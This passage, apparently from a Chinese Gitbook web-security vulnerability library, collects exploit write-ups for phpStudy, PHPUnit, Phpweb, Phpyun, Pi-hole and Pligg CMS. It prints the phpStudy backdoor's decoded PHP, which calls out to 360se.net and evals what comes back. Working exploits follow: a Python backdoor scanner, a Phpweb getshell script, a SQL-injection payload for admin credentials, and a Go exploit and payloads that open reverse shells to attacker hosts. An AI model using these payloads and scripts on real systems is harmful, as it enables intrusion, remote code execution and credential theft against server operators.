构造HTTP头，把Accept-Encoding改成Accept-Encoding: gzip,deflate可以触发第一个部分。 GET /index.php HTTP/1.1 Host: www.0-sec.org ….. Accept-Encoding: gzip,deflate Accept-Charset:cHJpbnRmKG1kNSgzMzMpKTs= …. 第二部分，反向连接：判断ACCEPT_ENCODING如果等于compress,gzip，通过关键部分\\@eval(gzuncompress(\\'%s\\'));可以看到拼接了一段恶意代码，然后调用gzuncompress方法执行解密。 构造HTTP头，把Accept-Encoding改成Accept-Encoding: compress,gzip可以触发第二部分。 GET /index.php HTTP/1.1 Host: www.0-sec.org ….. Accept-Encoding:compress,gzip …. /media/rId29.jpg) 图2：第1部分流程判断代码 /media/rId30.jpg) 图3：第2部分流程判断代码 这一部分有两处会执行zend_eval_strings函数代码的位置。分别是从1000D66C到1000E5C4的代码解密： @ini_set(\"display_errors\",\"0\"); error_reporting(0); function tcpGet($sendMsg = '', $ip = '360se.net', $port = '20123'){ $result = \"\"; $handle = stream_socket_client(\"tcp://{$ip}:{$port}\", $errno, $errstr,10); if( !$handle ){ $handle = fsockopen($ip, intval($port), $errno, $errstr, 5); if( !$handle ){ return \"err\"; } } fwrite($handle, $sendMsg.\"\\n\"); while(!feof($handle)){ stream_set_timeout($handle, 2); $result .= fread($handle, 1024); $info = stream_get_meta_data($handle); if ($info['timed_out']) { break; } } fclose($handle); return $result; } $ds = array(\"www\",\"bbs\",\"cms\",\"down\",\"up\",\"file\",\"ftp\"); $ps = array(\"20123\",\"40125\",\"8080\",\"80\",\"53\"); $n = false; do { $n = false; foreach ($ds as $d){ $b = false; foreach ($ps as $p){ $result = tcpGet($i,$d.\".360se.net\",$p); if ($result != \"err\"){ $b =true; break; } } if ($b)break; } $info = explode(\"\",$result); if (count($info)==4){ if (strpos($info[3],\"/*Onemore*/\") !== false){ $info[3] = str_replace(\"/*Onemore*/\",\"\",$info[3]); $n=true; } @eval(base64_decode($info[3])); } }while($n); /media/rId31.jpg) 从1000D028 到1000D66C的代码解密： @ini_set(\"display_errors\",\"0\"); error_reporting(0); $h = $_SERVER['HTTP_HOST']; $p = $_SERVER['SERVER_PORT']; $fp = fsockopen($h, $p, $errno, $errstr, 5); if (!$fp) { } else { $out = \"GET {$_SERVER['SCRIPT_NAME']} HTTP/1.1\\r\\n\"; $out .= \"Host: {$h}\\r\\n\"; $out .= \"Accept-Encoding: compress,gzip\\r\\n\"; $out .= \"Connection: Close\\r\\n\\r\\n\"; fwrite($fp, $out); fclose($fp); } /media/rId32.jpg) 动态调试构造传参内容 OD动态调试传参值需要对httpd.exe进程进行附加调试，phpstudy启用的httpd进程有两个。一个是带有参数的，一个是没有带参数的。在下断的时候选择没有参数的httpd.exe下断才能触发后门。 根据前面IDA静态分析得到的后门函数地址，OD附加进程后从httpd.exe调用的模块里找到php_xmlrpc.dll模块，在DLL空间里定位后门函数地址0x100031F0，可能还需要手动修改偏移后下断点。使用burpsuite，构造Accept-Encoding的内容。发包后可以动态调试。建立触发点的虚拟机快照后可以反复跟踪调试得到最终可利用的payload。 /media/rId34.jpg) 图4：OD动态调试Payload PHP脚本后门分析 脚本一功能：使用fsockopen模拟GET发包 @ini_set(\"display_errors\",\"0\"); error_reporting(0); $h = $_SERVER['HTTP_HOST']; $p = $_SERVER['SERVER_PORT']; $fp = fsockopen($h, $p, $errno, $errstr, 5); if (!$fp) { } else { $out = \"GET {$_SERVER['SCRIPT_NAME']} HTTP/1.1\\r\\n\"; $out .= \"Host: {$h}\\r\\n\"; $out .= \"Accept-Encoding: compress,gzip\\r\\n\"; $out .= \"Connection: Close\\r\\n\\r\\n\"; fwrite($fp, $out); fclose($fp); } 脚本二功能：内置有域名表和端口表，批量遍历然后发送数据。注释如下： \",$result); if (count($info)==4){ if (strpos($info[3],\"/*Onemore*/\") !== false){ $info[3] = str_replace(\"/*Onemore*/\",\"\",$info[3]); $n=true; } @eval(base64_decode($info[3])); } }while($n); ?> POC 熟悉原理后可根据执行流程构造执行任意代码的Payload： GET /index.php HTTP/1.1 Host: www.0-sec.org Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3 Accept-Encoding:gzip,deflate Accept-Charset:cHJpbnRmKG1kNSgzMzMpKTs= Content-Length: 0 Accept-Language: zh-CN,zh;q=0.9 Connection: close Payload：printf(md5(333)); 回显特征：310dcbbf4cce62f762a2aaa148d556bd /media/rId37.jpg) 图5：Payload回显验证 exp #!/usr/bin/env python3 #-*- encoding:utf-8 -*- # 卿 博客:https://www.cnblogs.com/-qing-/ import base64 import requests import threading import queue print(\"======Phpstudy Backdoor Exploit============\\n\") print(\"===========By Qing=================\\n\") print(\"=====Blog：https://www.cnblogs.com/-qing-/==\\n\") payload = \"echo \\\"qing\\\";\" payload = base64.b64encode(payload.encode('utf-8')) payload = str(payload, 'utf-8') headers = { 'Upgrade-Insecure-Requests': '1', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3', 'Accept-Language': 'zh-CN,zh;q=0.9', 'accept-charset': payload, 'Accept-Encoding': 'gzip,deflate', 'Connection': 'close', } def write_shell(url,headers): try: r = requests.get(url=url+'/index.php', headers=headers, verify=False,timeout=30) if \"qing\" in r.text: print ('[ + ] BackDoor successful: '+url+'===============[ + ]\\n') with open('success.txt','a') as f: f.write(url+'\\n') else: print ('[ - ] BackDoor failed: '+url+'[ - ]\\n') except: print ('[ - ] Timeout: '+url+' [ - ]\\n') url = \"http://xxx\" write_shell(url=url,headers=headers) Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:01:35 "},"Web安全/PHPUnit/（CVE-2017-9841）PHPunit 远程代码执行漏洞/（CVE-2017-9841）PHPunit 远程代码执行漏洞.html":{"url":"Web安全/PHPUnit/（CVE-2017-9841）PHPunit 远程代码执行漏洞/（CVE-2017-9841）PHPunit 远程代码执行漏洞.html","title":"（CVE-2017-9841）PHPunit 远程代码执行漏洞","keywords":"","body":"（CVE-2017-9841）PHPunit 远程代码执行漏洞 一、漏洞简介 TYPO3是瑞士TYPO3协会维护的一套免费开源的内容管理系统。PHPUnit是其中的一个基于PHP的测试框架。PHPUnit4.8.28之前的版本和5.6.3之前的5.x版本中的Util/PHP/eval-stdin.php文件存在安全漏洞。远程攻击者可通过发送以' 二、漏洞影响 PHPUnit 4.8.19-4.8.27PHPUnit 5.0.10-5.6.2 三、复现过程 $ curl --data \"总体来说就是向vendor/phpunit/src/Util/PHP/eval-stdin.php发送POST请求执行php代码。PHPunit远程代码执行漏洞/media/rId24.png)PHPunit远程代码执行漏洞/media/rId25.png)也可以直接写入一句话**\\\\');**PHPunit远程代码执行漏洞/media/rId26.png)PHPunit远程代码执行漏洞/media/rId27.png) poc 因为直接是RCE，如果当前目录可写，直接POST这样的body: 菜刀中转脚本 使用20160622版本的菜刀，可以直接连目标，可以执行命令，但是不可以上传修改文件。 array ( 'method' => 'POST', 'header'=> \"Content-type: application/x-www-form-urlencoded\\r\\n\" . \"Content-Length: \" . strlen($data) . \"\\r\\n\", 'content' => $data) ); $context = stream_context_create($opts); $html = @file_get_contents($webshell, false, $context); echo $html; ?> Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:01:38 "},"Web安全/PHPUnit/PHPUnit eval-stdin.php 远程命令执行漏洞/PHPUnit eval-stdin.php 远程命令执行漏洞.html":{"url":"Web安全/PHPUnit/PHPUnit eval-stdin.php 远程命令执行漏洞/PHPUnit eval-stdin.php 远程命令执行漏洞.html","title":"PHPUnit eval-stdin.php 远程命令执行漏洞","keywords":"","body":"PHPUnit eval-stdin.php 远程命令执行漏洞 漏洞描述 PHPUnit5.6.3之前的版本，存在一处远程代码执行漏洞，利用漏洞可以获取服务器敏感信息及权限。 漏洞影响 PHPUnit 漏洞复现 漏洞位于 /phpunit/src/Util/PHP/eval-stdin.php 其中关键代码为: eval('?>'.file_get_contents('php://input')); 发送如下请求包执行PHP代码 POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1 Host: Content-Length: 21 Accept-Encoding: gzip Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:01:37 "},"Web安全/Phpweb/Phpweb 前台getshell/Phpweb 前台getshell.html":{"url":"Web安全/Phpweb/Phpweb 前台getshell/Phpweb 前台getshell.html","title":"Phpweb 前台getshell","keywords":"","body":"Phpweb 前台getshell 一、漏洞简介 漏洞影响文件:/base/post.php /base/appfile.php /base/appplue.php /base/appborder.php 二、漏洞影响 Phpweb\\ 三、复现过程 1.首先要获取加密前的Md5值，用于文件较检,通过Post提交数据来获取! curl \"http://website/base/post.php\" -H \"act=appcode\" ac34c64cdb405eff881efc5476a64761 ##这个就是初始值 2.获取加密后得md5值 然后将初始值md5加密(ac34c64cdb405eff881efc5476a64761 + \"a\") 得到加密后的MD5值! e10adc3949ba59abbe56e057f20f883e ##这个就是加密后的md5值(终值)! 3.Getsehll exp: Filename: 然后...Getshell! 当出现OK两个大字时,说明你成功了!!! 上传的shell路径是 http://www.0-sec.org/effect/source/bg/shell名称.php 工具编写 Python exp[Python3]: # -*- coding: UTF-8 -*- # import os import requests import hashlib bdlj = os.getcwd() headers = open(bdlj+\"\\headers.txt\",'r') headerss = headers.read() print('\\b') ur = input(\"请输入目标网址:\") requrl = ur + '/base/post.php' reqdata = {\"act\":\"appcode\"} r = requests.post(requrl,data=reqdata) cz=r.text[2:34] print ('初值:' + cz) cz=r.text[2:34]+\"a\" m = hashlib.md5() b = cz.encode(encoding='utf-8') m.update(b) zz = m.hexdigest() print ('终值:' + zz) infile = open(bdlj + \"\\datas.txt\", \"r\",encoding='utf-8') outfile = open(bdlj + \"\\datah.txt\", \"w\",encoding='utf-8') for line in infile: outfile.write(line.replace('156as1f56safasfasfa', zz)) infile.close() outfile.close() datas = open(bdlj+\"\\datah.txt\",'r') datass = datas.read() gs = requests.post(ur + '/base/appfile.php',data=datass,headers={'Content-Type':headerss}) gs.encoding = 'utf-8' print (gs.text) if {gs.text == \"OK\"}: print (\"Getshell成功! Shell:\" + ur + \"/effect/source/bg/mstir.php\") else: print (\"Getsehll失败!\") 整包下载地址:https://github.com/ianxtianxt/Phpweb-Getshell-py 使用请下载整包,否则会缺少协议头和data数据! 使用教程: 参考链接 https://m4tir.github.io/Phpweb-Reception-Getshell Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:01:39 "},"Web安全/PhpYun/Phpyun v3.1 xml 注入漏洞/Phpyun v3.1 xml 注入漏洞.html":{"url":"Web安全/PhpYun/Phpyun v3.1 xml 注入漏洞/Phpyun v3.1 xml 注入漏洞.html","title":"Phpyun v3.1 xml 注入漏洞","keywords":"","body":"Phpyun v3.1 xml 注入漏洞 一、漏洞简介 函数过滤不严谨，用户POST过去的内容没有进行任何过滤，导致攻击者可以利用XML实体进行注入，从而获取数据库敏感信息 二、漏洞影响 3.1 build14061 三、复现过程 漏洞分析 本次漏洞文件位于 weixin/model/index.class.php ，代码如下： private function responseMsg() { $postStr = $GLOBALS[\\\"HTTP_RAW_POST_DATA\\\"]; if (!empty($postStr)){ $postObj = simplexml_load_string($postStr, 'SimpleXMLElement', LIBXML_NOCDATA); $fromUsername = $postObj->FromUserName; $toUsername = $postObj->ToUserName; $keyword = trim($postObj->Content); $time = time(); $textTpl = \" %s 0 \"; if(!empty( $keyword )) { $msgType = \"text\"; $contentStr = \"Welcome to wechat world!\"; $resultStr = sprintf($textTpl, $fromUsername, $toUsername, $time, $msgType, $contentStr); echo $resultStr; }else{ echo \"Input something...\"; } }else { echo \"\"; exit; } } 这里将$postStr = $GLOBALS[\\\"HTTP_RAW_POST_DATA\\\"]，通过 simplexml_load_string解析后的内容，将其直接带入了$textTpl。 然而$postStr = $GLOBALS[\\\"HTTP_RAW_POST_DATA\\\"] ，直接获取了POST过来的XML内容，没有经过任何处理，并在最后将其输出。 if($MsgType==\\'event\\') { $MsgEvent = $postObj->Event; if ($MsgEvent==\\'subscribe\\') { $centerStr = \\\"\\config[\\'sy_webname\\']).\\\"！/n 1：您可以直接回复关键字如【销售】、【南京 销售】、【南京 销售 XX公司】查找您想要的职位/n绑定您的账户体验更多精彩功能/n感谢您的关注！]]>\\\"; $this->MsgType = \\'text\\'; }elseif ($MsgEvent=='CLICK') { $EventKey = $postObj->EventKey; if($EventKey=='我的帐号'){ $centerStr = $this->bindUser($fromUsername); }elseif($EventKey=='我的消息') { $centerStr = $this->myMsg($fromUsername); }elseif($EventKey=='面试邀请') { $centerStr = $this->Audition($fromUsername); }elseif($EventKey=='简历查看') { $centerStr = $this->lookResume($fromUsername); }elseif($EventKey=='刷新简历') { $centerStr = $this->refResume($fromUsername); 从上述代码可以看出来，当满足那上面的条件后都会进入不同的相应的函数，但是都会进入一个名为isBind函数。 接下来追踪isBind函数： private function isBind($wxid=\\'\\') { if($wxid) { $User = $this->obj->DB_select_once(\"member\",\"`wxid`='\".$wxid.\"'\",\"`uid`,`username`\"); } if($User['uid']>0) { $User['bindtype'] = '1'; $User['cenetrTpl'] = \"config['sy_webname']).\"帐号：\".$User['username'].\"已成功绑定！ /n/n/n 您也可以config['sy_weburl'].\"/wap/index.php?m=login&wxid=\".$wxid.\"/\">点击这里进行解绑或绑定其他帐号]]>\"; }else{ $Token = $this->getToken(); $Url = 'https://api.weixin.qq.com/cgi-bin/user/info?access_token='.$Token.'&openid='.$wxid.'&lang=zh_CN'; $CurlReturn = $this->CurlPost($Url); $UserInfo = json_decode($CurlReturn); $wxid = $wxid; $wxname = $UserInfo->nickname; $this->config['token_time'] = time(); $User['cenetrTpl'] = '点击这里进行绑定!]]>'; } return $User; } 可以看到，从始至终wxid变量始终没有经过任何过滤，在第一行的$wxid就是我们传进来的FromUserName的值，可以直接进入SQL语句，进行任意注入。 因此我们可以针对其构造Payload，内容如下： 一般来说，我们只需要将Payload以POST形式的数据发出去，就可以成功的获取数据库敏感信息，但是服务器如果有WAF，提交的恶意数据必然会被拦截，因此，我们需要修改HTTP头，伪装成XML就可以不受到WAF的拦截： Content-type:text/xml;charset=utf-8 漏洞复现 我们首先打开目标站点，点击网页左侧注册按钮，首先注册一个账号： 这个时候已经是登录状态，我们按F9 调出 Hack Bar 的界面，点击Enable Post data ，将Payload写入输入框，如下图所示： payload文件: 注:payload文件内容需手动输入相应位置 1111 1111' and 1=2 union select 1,(select concat(username,password) from phpyun_member limit 0,1)# 1402550611 event CLICK 我的账号 0 接下来还需要修改HTTP头，伪装成XML，点击浏览器上方工具栏，打开Tamper Data ，点击启动。 现在前提工作已经做好，接下来重新访问网站，Tamper Data 就会抓取到数据包，再对数据包进行更改，操作如图： 然后点击确定就可以将构造好的数据包发出去： 成功获取管理员账号密码。 参考链接 https://blog.csdn.net/whatiwhere/article/details/84862236 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:01:41 "},"Web安全/PhpYun/Phpyun v4.2（部分） 4.3 4.5 系统重装漏洞/Phpyun v4.2（部分） 4.3 4.5 系统重装漏洞.html":{"url":"Web安全/PhpYun/Phpyun v4.2（部分） 4.3 4.5 系统重装漏洞/Phpyun v4.2（部分） 4.3 4.5 系统重装漏洞.html","title":"Phpyun v4.2（部分） 4.3 4.5 系统重装漏洞","keywords":"","body":"Phpyun v4.2（部分） 4.3 4.5 系统重装漏洞 一、漏洞简介 二、漏洞影响 经测试该漏洞影响从4.3到 4.5 所有版本，4.2部分版本受影响，4.2最终版本不受影响。具体情况请自行测试。 三、复现过程 漏洞分析 看到install 文件夹里的index.php，这里分php5,php7两种情况进行调用安装。 以php5为例。 文件 根目录/install/php5/install.php 代码中： 先判断了是否存在lock文件，存在即退出安装。 4.34.5系统重装漏洞/media/rId25.png) 其中S_ROOT这个常量是在前面index.php文件中定义的。 4.34.5系统重装漏洞/media/rId26.png) 取得是当前文件的绝对路径。拼接起来，检测的lock文件位置应该是 根目录/install/data/phpyun.lock。 这里没什么问题。 按照正常安装走完，看到最后一步 4.34.5系统重装漏洞/media/rId27.png) 创建lock文件，这里用的是相对路径。install.php是被index.php 用require的模式调用的。 取得路径应该是 根目录/install/，按照上图的路径创造的lock文件应该是放至于 根目录/data/phpyun.lock。 创建的lock文件路径是 根目录/data/phpyun.lock，检测的路径却是 根目录/install/data/phpyun.lock 那么一个重装的安全隐患就埋下了。 当用户安装完成之后，是可以被无限重装的，因为这个路径错误问题。 以本地phpyun4.3 已经安装完成系统为例，是可以被重装的。 4.34.5系统重装漏洞/media/rId28.png) 最新版phpyun 4.5这里的代码和4.3是一样的。 4.34.5系统重装漏洞/media/rId29.png) phpyun 4.2 版本处理逻辑不一样，这个版本不受影响。 4.34.5系统重装漏洞/media/rId30.png) 4.34.5系统重装漏洞/media/rId31.png) 经测试phpyun 4.2某些版本依旧是受影响的。 版本测试 网上一些系统： 官方测试站，版本phpyun 4.2111： 4.34.5系统重装漏洞/media/rId34.png) 某招聘网，版本phpyun 4.3 4.34.5系统重装漏洞/media/rId36.png) 参考链接 https://www.cnblogs.com/r00tuser/p/8533517.html Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:01:43 "},"Web安全/PhpYun/Phpyun v4.5 后台getshell/Phpyun v4.5 后台getshell.html":{"url":"Web安全/PhpYun/Phpyun v4.5 后台getshell/Phpyun v4.5 后台getshell.html","title":"Phpyun v4.5 后台getshell","keywords":"","body":"Phpyun v4.5 后台getshell 一、漏洞简介 二、漏洞影响 Phpyun v4.5 三、复现过程 payload： Url： http://www.0-sec.org/admin/index.php?m=database&c=backup Post： pytoken=3c3140b58f5e&table[]=]=1;phpinfo();//&maxfilesize=1111 漏洞复现过程： 首先进入后台-》点击工具-》数据-》数据库管理-》自定义备份-》随便选择一个表-》提交备份 抓包，修改table[] 参数-》发送 产生的文件就在uploads/data/plus/bdata/phpyun_20200312153927/config.phpUrl：访问（这里搭建的时候环境，我默认指向了uploads） Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:01:45 "},"Web安全/PhpYun/Phpyun v5.0.1 后台getshell/Phpyun v5.0.1 后台getshell.html":{"url":"Web安全/PhpYun/Phpyun v5.0.1 后台getshell/Phpyun v5.0.1 后台getshell.html","title":"Phpyun v5.0.1 后台getshell","keywords":"","body":"Phpyun v5.0.1 后台getshell 一、漏洞简介 二、漏洞影响 Phpyun v5.0.1 三、复现过程 安装好本地环境,看了下系统功能,等等测试,最后查看前台index.php源码。 后台直接写入被过滤掉了。 又去翻了下后台功能,发下有个生成功能,并且没有后缀限制。 生存成功,但是发现()被大写,使用经典的include包含,随意找了一个模板下的info.txt文件,写入执行代码。 成功执行代码 代码分析： 对post的数据没有任何验证,直接代入 参考链接 https://www.t00ls.net/thread-55040-1-1.html Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:01:47 "},"Web安全/Pi-hole/（CVE 2020-8816）Pi-hole 远程代码执行漏洞/（CVE 2020-8816）Pi-hole 远程代码执行漏洞.html":{"url":"Web安全/Pi-hole/（CVE 2020-8816）Pi-hole 远程代码执行漏洞/（CVE 2020-8816）Pi-hole 远程代码执行漏洞.html","title":"（CVE 2020-8816）Pi-hole 远程代码执行漏洞","keywords":"","body":"（CVE 2020-8816）Pi-hole 远程代码执行漏洞 一、漏洞简介 二、漏洞影响 Pi-hole \\ 三、复现过程 漏洞分析 ./scripts/pi-hole/php/savesettings.php { // Accepted input format: 00:01:02:1A:5F:FF (characters may be lower case) return (preg_match('/([a-fA-F0-9]{2}[:]?){6}/', $mac_addr) == 1); } $mac = $_POST[\"AddMAC\"]; if(!validMAC($mac)) {...} $mac = strtoupper($mac); if(isset($_POST[\"addstatic\"])) { ... exec(\"sudo pihole -a addstaticdhcp \".$mac.\" \".$ip.\" \".$hostname); ... } if(isset($_POST[\"removestatic\"])) { ... exec(\"sudo pihole -a removestaticdhcp \".$mac); ... } 注意到，在validMAC函数中，只使用preg_match对MAC地址的格式进行了检查，而preg_match函数的作用是根据正则表达式的模式对字符串进行搜索匹配，并返回匹配字数。因此，只要用户的输入中存在MAC地址，就可以通过检查。 通过检查的用户输入做了一次大写转换，然后直接放入了exec函数中。 最终的payload aaaaaaaaaaaa&&SHORT=${PATH##/***:/}&&A=${SHORT#???}&&P=${A%/???}&&B=${PWD#/???/???/}&&H=${B%???/?????}&&C=${PWD#/??}&&R=${C%/???/????/?????}&&$P$H$P$IFS-$R$IFS'EXEC(HEX2BIN(\"706870202d72202724736f636b3d66736f636b6f70656e28223139322e3136382e312e313035222c32323536293b6578656328222f62696e2f7368202d69203c2633203e263320323e263322293b27\"));'&& payload分析 1、模拟MAC地址 aaaaaaaaaaaa 根据源码中的validMAC()函数，我们得知程序会对用户输入做一个基本的MAC地址格式判断，只要由12个字母或数字组成，就可以通过验证。 2、获取p,h,r的小写字符 SHORT=${PATH##/***:/}&&A=${SHORT#???}&&P=${A%/???}&&B=${PWD#/???/???/}&&H=${B%???/?????}&&C=${PWD#/??}&&R=${C%/???/????/?????} 原本的payload应该为： aaaaaaaaaaaa&&php -r ‘$sock=fsockopen(“target.0-sec.org”,2256);exec(“/bin/sh -i &3 2>&3”);’ 但是由于程序会对用户输入做一个大写转换，因此，php -r会变成PHP -R，命令无法识别，因此需要找到一种方式获取p、h、r的小写字符。 可以使用环境变量，变量名都是大写字母，而变量值中可能包含各种小写字母。 在浏览器中进入DHCP选项卡，先试一下PATH变量，输入aaaaaaaaaaaa\\$PATH，结果显示：\">http://www.0-sec.org/admin，登陆后，选择Setting-\\>DHCP选项卡，先试一下PATH变量，输入aaaaaaaaaaaa\\$PATH，结果显示： Pi-hole远程代码执行漏洞/media/rId26.png) 很遗憾，没有h字符，看来还需要找其他环境变量。我在env命令的执行结果中找到了PWD变量，输入试一下： Pi-hole远程代码执行漏洞/media/rId27.png) 里面有h和r，所以，我可以使用PATH和PWD两个环境变量，获得p、h、r这几个字符。 我使用了Shell参数扩展对这两个变量值进行截取： p: SHORT=${PATH##/***:/}&&A=${SHORT#???}&&P=${A%/???} h: B=${PWD#/???/???/}&&H=${B%???/?????} r: C=${PWD#/??}&&R=${C%/???/????/?????} 根据模式匹配的规则，应该可以写出更简洁的方法，但是我的系统中好多shell选项都没有开启，考虑到通用性，我就直接选择了最傻瓜的匹配方式。 3、获得反向shell $P$H$P$IFS-$R$IFS'EXEC(HEX2BIN(\"706870202d72202724736f636b3d66736f636b6f70656e28223139322e3136382e312e313035222c32323536293b6578656328222f62696e2f7368202d69203c2633203e263320323e263322293b27\"));' 先把变量换成对应的字符，注意上面的$IFS是shell的一个内定变量，默认为，这里代替空格。 php -r 'exec(hex2bin(\"706870202d72202724736f636b3d66736f636b6f70656e28223139322e3136382e312e313035222c32323536293b6578656328222f62696e2f7368202d69203c2633203e263320323e263322293b27\"))' 然后替换hex2bin的执行结果（转义符是我后加的）： php -r 'exec(php -r \\'$sock=fsockopen(\"target.0-sec.org\",2256);exec(\"/bin/sh -i &3 2>&3\");\\')' 这段代码就可以获得一个反向shell。 漏洞复现 在主机的命令行中输入： ncat -nlvp 2256 进入监听模式，等待其他机器的连接。 返回虚拟机，在浏览器中打开http://192.168.1.107/admin，登录，选择Setting->DHCP选项卡，输入payload： aaaaaaaaaaaa&&SHORT=${PATH##/***:/}&&A=${SHORT#???}&&P=${A%/???}&&B=${PWD#/???/???/}&&H=${B%???/?????}&&C=${PWD#/??}&&R=${C%/???/????/?????}&&$P$H$P$IFS-$R$IFS'EXEC(HEX2BIN(\"706870202d72202724736f636b3d66736f636b6f70656e28223139322e3136382e312e313035222c32323536293b6578656328222f62696e2f7368202d69203c2633203e263320323e263322293b27\"));'&& 返回主机，可以看到主机收到了连接，可以执行命令了：Pi-hole远程代码执行漏洞/media/rId31.png) poc CVE-2020-8816.go go run CVE-2020-8816.go -host $LHOST -p $LPORT -pass admin -u http://www.0-sec.org/admin/ ./CVE-2020-8816 -host $LHOST -p $LPORT -pass admin -u http://www.0-sec.org/admin/ Pi-hole远程代码执行漏洞/media/rId33.png) Pi-hole远程代码执行漏洞/media/rId34.png) Pi-hole远程代码执行漏洞/media/rId35.png) package main import ( \"flag\" \"log\" \"strings\" \"github.com/anaskhan96/soup\" \"encoding/hex\" \"github.com/levigross/grequests\" ) type Options struct { url, password, host, port string } var HOST string var URL string var PORT string var PASSWD string func generate_shell() string{ payload := \"php -r '$sock=fsockopen(\\\"HOST\\\", PORT);exec(\\\"/bin/sh -i &3 2>&3\\\");'\" payload = strings.Replace(payload, \"HOST\", HOST, 1) payload = strings.Replace(payload, \"PORT\", PORT, 1) return hex.EncodeToString([]byte(payload)) } func extractFlags() *Options { urlPtr := flag.String(\"u\", \"http://10.0.0.1/admin/\", \"Set the Url of the admin panel\") passPtr := flag.String(\"pass\", \"admin\", \"Admin Password\") hostPtr := flag.String(\"host\", \"10.0.0.1\", \"Set the host for the reverse shell\") portPtr := flag.String(\"p\", \"1337\", \"Set Port for the reverse shell\") flag.Parse() return &Options{*urlPtr, *passPtr, *hostPtr,*portPtr} } func doLogin(ses *grequests.Session) *grequests.Session{ log.Println(\"Logging In...\") resp, err := ses.Post(URL+\"index.php\",&grequests.RequestOptions{Data: map[string]string{\"pw\": PASSWD}}) if err != nil { log.Fatal(\"Error logging-in: \", err) } if resp.Ok != true { log.Println(\"Request for log-in did not return OK\") } log.Println(\"Logged In!\") return ses } func getToken(ses *grequests.Session) string{ resp, err:= ses.Get(URL+\"index.php\",nil) if err != nil { log.Fatal(\"Error getting token: \", err) } if resp.Ok != true { log.Println(\"Request for getting token did not return OK\") } html := soup.HTMLParse(resp.String()) token := html.Find(\"div\",\"id\",\"token\").Text() return token } func Exploit(ses *grequests.Session, token string, payload string) { full_payload := \"aaaaaaaaaaaa&&W=${PATH#/???/}&&P=${W%%?????:*}&&X=${PATH#/???/??}&&H=${X%%???:*}&&Z=${PATH#*:/??}&&R=${Z%%/*}&&$P$H$P$IFS-$R$IFS'EXEC(HEX2BIN(\\\"\" + payload + \"\\\"));'&&\" resp,err := ses.Post(URL + \"settings.php\", &grequests.RequestOptions{Data: map[string]string{ \"AddMAC\":full_payload, \"field\":\"DHCP\", \"AddIP\":\"10.10.10.10\", \"AddHostname\":\"10.10.10.10\", \"addstatic\":\"\", \"token\":token}}) if err != nil { log.Fatal(\"Error sending payload: \", err) } if resp.Ok != true { log.Println(\"Request for sending payload did not return OK\") } } func main(){ options := extractFlags() HOST = options.host URL = options.url PORT = options.port PASSWD = options.password session := grequests.NewSession(nil) doLogin(session) log.Println(\"Getting Token...\") token := getToken(session) log.Println(\"Token:\",token) log.Println(\"Generating payload...\") payload := generate_shell() log.Println(\"Payload generated:\",payload) log.Println(\"Sending exploit...\") Exploit(session, token, payload) log.Println(\"Exploit executed, check your session\") } 参考链接 https://www.freebuf.com/vuls/234533.html https://github.com/team0se7en/CVE-2020-8816/blob/master/CVE-2020-8816.go Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:01:51 "},"Web安全/Pi-hole/（CVE-2019-13051）Pi-Hole 远程代码执行漏洞/（CVE-2019-13051）Pi-Hole 远程代码执行漏洞.html":{"url":"Web安全/Pi-hole/（CVE-2019-13051）Pi-Hole 远程代码执行漏洞/（CVE-2019-13051）Pi-Hole 远程代码执行漏洞.html","title":"（CVE-2019-13051）Pi-Hole 远程代码执行漏洞","keywords":"","body":"（CVE-2019-13051）Pi-Hole 远程代码执行漏洞 一、漏洞简介 通过描述的\"AdminLTE\"组件上的漏洞，可以远程获得RaspberyPi设备（或应用程序正在运行的任何设备/VM）上的根访问权限。要利用此漏洞，需要对AdminLTE web界面的管理访问权限凭据。 二、漏洞影响 Pi-Hole \\ 三、复现过程 在管理员邮箱处添加 \"`test>/tmp/poc_proof.txt`\"@0-sec.org Pi-Hole远程代码执行漏洞/media/rId24.png) 由于该系统设定原因，需等待十分钟后，即可发现/tmp/poc_proof.txt 已经被创建 Pi-Hole远程代码执行漏洞/media/rId25.jpg) 深入利用 现在攻击机上执行反弹shell命令 nc -nvlp 4444 在管理邮箱处执行反弹shell代码 \"`nc${IFS}192.168.1.69${IFS}4444>/tmp/revshell.py`\"@0-sec.org Pi-Hole远程代码执行漏洞/media/rId27.png) 我们可以看到http请求如下所示 Pi-Hole远程代码执行漏洞/media/rId28.png) 随后等待十分钟，查看是否执行成功 在确保执行成功后，继续执行nc反弹shell命令 nc -nvlp 4445 最后，再向网站执行反弹shell命令 “`python${IFS}/tmp/revshell.py`”@0-sec.org 等待十分钟后，查看回显结果 Pi-Hole远程代码执行漏洞/media/rId29.jpg) Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:01:49 "},"Web安全/Pligg CMS/（CVE-2020-25287）Pligg CMS 2.0.3 远程命令执行漏洞/（CVE-2020-25287）Pligg CMS 2.0.3 远程命令执行漏洞.html":{"url":"Web安全/Pligg CMS/（CVE-2020-25287）Pligg CMS 2.0.3 远程命令执行漏洞/（CVE-2020-25287）Pligg CMS 2.0.3 远程命令执行漏洞.html","title":"（CVE-2020-25287）Pligg CMS 2.0.3 远程命令执行漏洞","keywords":"","body":"（CVE-2020-25287）Pligg CMS 2.0.3 远程命令执行漏洞 一、漏洞简介 该漏洞源于模板编辑器可以编辑任何文件。攻击者可利用该漏洞执行任意命令。 二、漏洞影响 Pligg CMS 2.0.3 三、复现过程 POC 